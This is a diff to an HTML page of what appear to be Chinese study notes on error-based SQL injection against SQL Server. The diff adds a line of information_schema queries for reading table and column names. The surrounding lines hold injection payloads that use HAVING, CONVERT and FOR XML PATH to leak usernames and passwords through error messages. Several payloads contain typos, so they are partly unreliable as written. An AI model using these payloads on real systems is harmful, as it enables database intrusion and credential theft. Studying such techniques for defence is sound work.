@@ -577,6 +577,7 @@
                 <p>SQL Server 注入’<br>SQL  Server 可以精确到定位错误消息。因此攻击者通过错误消息来提取消息<br>select * from user where  username&#x3D;’root’ and password&#x3D;’root’ having 1&#x3D;1–’<br>执行器：user.username 无效</p>
 <p>思想：将数据类型转换另外一种,或者把字符串和非字符串比较<br>1.利用havin子句’查询：’select user from username &#x3D;’root’ and 1 &gt; (select top1 username from user)</p>
 <p>sql server 内置函数（CASE CONVER）<br>select * from users where username &#x3D;’root’ and password&#x3D;’root’ and 1&#x3D;conver(int,select top 1 users.username from user)&#x2F;&#x2F;递归<br>FOR XML PATH ：’select * from users where username &#x3D;’root’ and password&#x3D;’root’ and 1&#x3D;CONVERT(int,(select stuff((select ‘,’+ user.username , ‘|’ +user.password from from users forxml path(‘’)),1,1,’’)))</p>
+<p>获取元素据<br>select table_name from information_schema.tables<br>select column_name from information_schema.column where table_name&#x3D;’student’</p>
 
                 
             </div>
